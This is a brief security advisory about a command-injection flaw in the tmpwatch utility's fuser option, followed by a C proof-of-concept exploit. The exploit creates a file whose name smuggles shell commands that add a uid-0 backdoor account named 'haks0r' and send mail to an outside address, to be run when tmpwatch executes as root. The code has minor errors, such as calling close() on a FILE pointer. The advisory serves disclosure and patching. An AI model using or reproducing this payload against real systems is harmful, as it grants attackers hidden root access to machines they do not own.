source: http://www.securityfocus.com/bid/1785/info

A vulnerability exists in tmpwatch, a utility which automates the removal of temporary files in unix-like systems. An optional component of tmpwatch, fuser, improperly handles arguments to system() library calls. If an attacker creates a file with a maliciously-constructed filename including shell meta characters, and -fuser is run on this file, the attacker may be able to execute arbitrary commands, potentially compromising superuser access if tmpwatch is run with root privileges.

#include <stdio.h>

int main()
{
   FILE *f;
   char filename[100] = ";useradd -u 0 -g 0 haks0r;mail 
haks0r@somehost.com<blablabla";

   if((f = fopen(filename, "a")) == 0) {
      perror("Could not create file");
      exit(1);
   }
   close(f);
}